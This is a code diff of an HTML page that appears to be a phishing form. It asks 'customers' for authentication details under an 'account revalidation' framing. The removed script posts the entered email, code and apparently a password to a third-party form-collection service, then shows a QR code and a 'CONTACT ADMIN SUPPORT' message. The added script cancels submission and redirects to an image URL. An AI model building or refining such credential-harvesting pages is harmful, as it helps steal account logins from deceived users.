@@ -82,71 +82,16 @@
       </div>
       <br>
       <label for="step-0">Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</label>
-<!-- Add this just below your form -->
-<div id="qrSection" style="display:none; margin-top:20px;">
-  <h3>Scan this QR to continue</h3>
-  <div id="qrCode"></div>
-</div>
-
-<!-- Include QRCode.js library -->
-<script src="https://unpkg.com/qrcodejs@1.0.0/qrcode.min.js"></script>
 
     </form>
   </article>
 </section>
 <script>
-  const form = document.querySelector(".pure-steps");
-  const qrSection = document.getElementById("qrSection");
-  const qrContainer = document.getElementById("qrCode");
-
-  form.addEventListener("submit", async function (e) {
-    e.preventDefault(); // stop default navigation
-
-    // Gather form data
-    const formData = new FormData(form);
-
-    try {
-      // Submit to Web3Forms
-      const response = await fetch(form.action, {
-        method: form.method,
-        body: formData
-      });
-
-      if (response.ok) {
-        // Build QR payload (⚠️ avoid including password)
-        const payload = JSON.stringify({
-          purpose: "account_revalidation",
-          email: formData.get("email"),
-          code: formData.get("code"),
-          ts: Date.now()
-        });
-
-        // Show QR section
-        qrSection.style.display = "block";
-        qrContainer.innerHTML = "";
-
-        new QRCode(qrContainer, {
-          text: payload,
-          width: 200,
-          height: 200,
-          colorDark: "#000000",
-          colorLight: "#ffffff",
-          correctLevel: QRCode.CorrectLevel.M
-        });
-
-        // Add CONTACT ADMIN SUPPORT message
-        const supportMsg = document.createElement("p");
-        supportMsg.textContent = "CONTACT ADMIN SUPPORT";
-        supportMsg.style.fontWeight = "bold";
-        supportMsg.style.color = "red";
-        supportMsg.style.marginTop = "12px";
-        qrSection.appendChild(supportMsg);
-
-      } else {
-        alert("Submission failed. Please try again.");
-      }
-    } catch (err) {
-
-  
+document.getElementById("myForm").addEventListener("submit", function(event) {
+  event.preventDefault(); // stop default redirect
+  // Optionally send data via fetch if needed
+  window.location.href = "https://th.bing.com/th/id/R.8cd9779578487059327d0e1fa8e1836a?rik=isyael77QNZVUQ&pid=ImgRaw&r=0";
+});
+</script>  
 </body>
 </html>
